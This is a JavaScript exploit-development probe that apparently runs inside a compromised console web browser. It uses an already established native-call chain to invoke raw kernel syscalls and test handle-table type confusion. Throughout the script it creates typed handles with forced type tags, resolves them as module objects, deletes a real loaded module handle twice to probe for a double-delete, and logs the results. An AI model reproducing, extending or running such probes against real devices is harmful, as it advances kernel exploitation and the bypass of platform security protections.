// Handle-table cross-confusion, first pass. Slots probe proved 557/558
// = create/delete on a global typed handle table whose high byte is a
// type tag, and one live type space (0x20xx) is the same space the 592
// dylib list uses (0x2001 libkernel_web, 0x49 WebKit, 0x53
// SlimClientVSH). Questions here: (A) does 557 arg3 force the type
// tag; (B) does 608 dynlib_info_ex resolve our created handles (module
// op on non-module object); (C) does 595; (D) 592 list snapshot before
// and (E) after a 558 delete of real module handle 0x53
// (SlimClientVSH — not in our execution path), plus the double-delete
// and a 608 re-resolve. Everything before E is proven-shape risk;
// the module delete is process-scoped table surgery. Full restore,
// PID verified, markers 7 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.dynlib_info_ex !== "number" ||
      typeof native.wrappers.dynlib_list !== "number")
    throw new Error("chain_or_wrappers_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var bufOffset = 0x200, bufLength = 0x400;
  var nameOffset = 0x700;
  var structOffset = 0x800, structLength = 0x1a8;
  var regionEnd = structOffset + structLength;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var bufAddress = address + bufOffset;
  var nameAddress = address + nameOffset;
  var structAddress = address + structOffset;
  var original = Array.from(frame.subarray(bufOffset, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function putName(text) {
    for (var i = 0; i < text.length; i++)
      frame[nameOffset + i] = text.charCodeAt(i);
    frame[nameOffset + text.length] = 0;
    for (var z = text.length + 1; z < 24; z++) frame[nameOffset + z] = 0;
  }
  var createdHandles = [];
  function alloc3(text, typeArg) {
    putName(text);
    var call = native.call("sys557", [nameAddress, text.length, typeArg]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    if (errno === null && call.value > 0 && call.value < 1000000)
      createdHandles.push(call.value);
    return call.value + "/" + (errno === null ? "ok" : errno);
  }
  function hexAt(offset, count) {
    var out = "";
    for (var i = 0; i < count; i++)
      out += ("0" + frame[offset + i].toString(16)).slice(-2);
    return out;
  }
  function infoEx(handle) {
    frame.fill(0, structOffset, structOffset + structLength);
    frame[structOffset] = 0xa8; frame[structOffset + 1] = 0x01;
    var info = native.call("dynlib_info_ex", [handle, 0, structAddress]);
    var errno = (info.value === -1) ? native.readErrno() : null;
    var extent = 0;
    for (var c = structLength - 1; c >= 0; c--)
      if (frame[structOffset + c] !== 0) { extent = c + 1; break; }
    return info.value + "/" + (errno === null ? "ok" : errno) +
      "/x" + extent + ":" + hexAt(structOffset, 48);
  }
  function call595(handle) {
    for (var i = 0; i < bufLength; i++)
      frame[bufOffset + i] = (i * 7 + 3) & 255;
    var call = native.call("sys595", [handle, bufAddress, bufLength]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    var extent = 0;
    for (var c = 0; c < bufLength; c++)
      if (frame[bufOffset + c] !== ((c * 7 + 3) & 255)) extent = c + 1;
    return call.value + "/" + (errno === null ? "ok" : errno) +
      "/x" + extent;
  }
  function call592() {
    for (var i = 0; i < bufLength; i++)
      frame[bufOffset + i] = (i * 7 + 3) & 255;
    var call = native.call("dynlib_list", [bufAddress, bufLength]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    var extent = 0;
    for (var c = 0; c < bufLength; c++)
      if (frame[bufOffset + c] !== ((c * 7 + 3) & 255)) extent = c + 1;
    var handles = "";
    for (var h = 0; h + 4 <= Math.min(extent, 108); h += 4) {
      var v = frame[bufOffset + h] + frame[bufOffset + h + 1] * 256 +
        frame[bufOffset + h + 2] * 65536 +
        frame[bufOffset + h + 3] * 16777216;
      if (v !== 0) handles += v.toString(16) + ",";
    }
    return call.value + "/" + (errno === null ? "ok" : errno) +
      "/x" + extent + "[" + handles + "]";
  }
  function del(id) {
    var call = native.call("sys558", [id, 0, 0]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    return call.value + "/" + (errno === null ? "ok" : errno);
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("confuse_preflight");
  phase = "alloc";
  var allocs =
    "t0:" + alloc3("Tzero", 0) +
    " t20:" + alloc3("Ttwenty", 0x20) +
    " t80:" + alloc3("Teighty", 0x80) +
    " ta0:" + alloc3("Taazero", 0xa0) +
    " t2001:" + alloc3("Tmod", 0x2001) +
    " t1:" + alloc3("Tone", 1);
  mark("confuse_allocated");
  phase = "info";
  var infoCreated = "m0x53:" + infoEx(0x53);
  for (var ch = 0; ch < createdHandles.length; ch++)
    infoCreated += " c" + createdHandles[ch].toString(16) + ":" +
      infoEx(createdHandles[ch]);
  mark("confuse_info_done");
  phase = "q595";
  var q595 = "";
  for (var q5 = 0; q5 < createdHandles.length && q5 < 2; q5++)
    q595 += "c" + createdHandles[q5].toString(16) + ":" +
      call595(createdHandles[q5]) + " ";
  mark("confuse_595_done");
  phase = "list_before";
  var listBefore = call592();
  mark("confuse_list_before");
  phase = "module_delete";
  var delOut = "d1:" + del(0x53) + " d2:" + del(0x53);
  var infoAfter = "m0x53_after:" + infoEx(0x53);
  mark("confuse_deleted");
  phase = "list_after";
  var listAfter = call592();
  mark("confuse_done");
  for (var r = 0; r < original.length; r++)
    frame[bufOffset + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[bufOffset + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  result = { id: "handle_confuse_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { allocs: allocs,
      info_608: infoCreated.slice(0, 510),
      q595: q595.trim(),
      list_before: listBefore.slice(0, 480),
      module_delete: delOut,
      info_after: infoAfter.slice(0, 200),
      list_after: listAfter.slice(0, 480),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "handle_confuse_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
